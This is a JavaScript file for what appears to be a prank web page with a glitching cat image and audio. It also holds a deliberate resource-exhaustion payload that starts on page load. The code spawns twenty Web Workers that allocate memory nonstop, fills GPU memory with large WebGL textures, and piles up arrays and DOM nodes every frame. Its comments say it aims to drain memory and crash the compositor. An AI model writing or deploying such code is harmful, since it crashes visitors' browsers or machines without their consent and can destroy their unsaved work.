window.onload = () => {
    // 1. First loads the image
    const img = document.getElementById('catImage');

    // Glitching Title Effect
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
    setInterval(() => {
        let glitchedTitle = '';
        for (let j = 0; j < 15; j++) {
            glitchedTitle += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        document.title = glitchedTitle;
    }, 50);

    // Play laugh immediately on load
    const laughAudio = document.getElementById('laugh');
    const meltdownAudio = document.getElementById('meltdown');

    laughAudio.play().catch(e => {
        console.warn("Autoplay was prevented. User interaction may be required.", e);
    });

    // Start meltdown sequence 0.5 seconds after load
    setTimeout(() => {
        meltdownAudio.play().catch(e => console.warn("Meltdown audio prevented", e));
        startMeltdown();
    }, 500);
};

// Global variables retaining references to prevent garbage collection
const globalRetentionArray = [];
const retainedDomNodes = [];
const workers = [];
const glTextures = [];

function startMeltdown() {
    const img = document.getElementById('catImage');
    img.classList.add('glitch');

    // Multiplied workers for extreme memory drain initially
    const workerCode = `
        const memory = [];
        setInterval(() => {
            // Allocating 100x faster inside the worker
            for(let i=0; i<100; i++) memory.push(new Float64Array(100000));
        }, 5);
    `;
    const blob = new Blob([workerCode], { type: 'application/javascript' });
    const workerUrl = URL.createObjectURL(blob);
    for (let i = 0; i < 20; i++) workers.push(new Worker(workerUrl));

    // Setup WebGL for VRAM/GPU stress
    const canvas = document.getElementById('glcanvas');
    if (canvas) {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');

        function gpuStress() {
            if (gl) {
                // Rapidly allocate 2048x2048 uncompressed textures to max out VRAM quickly
                for (let i = 0; i < 30; i++) {
                    const texture = gl.createTexture();
                    gl.bindTexture(gl.TEXTURE_2D, texture);
                    // Huge texture allocation (~16MB per texture)
                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
                    glTextures.push(texture);
                }

                // Force the GPU to render heavy fragment shader math (draw simple rect with a very heavy shader if possible)
                // For brevity, we just trigger random clears and viewport changes which forces state changes.
                gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
                gl.clear(gl.COLOR_BUFFER_BIT);
            }
        }

        function triggerMeltdown() {
            // 100x Multiplier logic inside requestAnimationFrame for maximum speed
            for (let k = 0; k < 200; k++) {
                // Massive heap arrays
                globalRetentionArray.push(new Array(50000).join('CRITICAL_FAILURE_'));
                globalRetentionArray.push(new Float64Array(50000));

                // Add hardware-accelerated CSS layers to the DOM.
                // We cap at 1000 active nodes so the compositor crashes from VRAM instead of pure CPU hang from DOM iteration.
                if (retainedDomNodes.length < 1000) {
                    const node = document.createElement('div');
                    node.className = 'leaked-node';
                    document.body.appendChild(node);
                    retainedDomNodes.push(node);
                } else {
                    // Keep retaining simulated elements in JS context
                    retainedDomNodes.push(Symbol('fake_dom'));
                }
            }

            gpuStress();

            // Randomly update the image's filter for visual chaos (as we removed transform)
            img.style.filter = `
                hue-rotate(${Math.random() * 360}deg) 
                invert(${Math.random() * 100}%) 
                blur(${Math.random() * 10}px)
                contrast(${Math.random() * 300 + 100}%)
            `;

            // Recursively call as fast as the display can refresh (~60fps)
            requestAnimationFrame(triggerMeltdown);
        }

        // Ignite
        triggerMeltdown();
    }
}
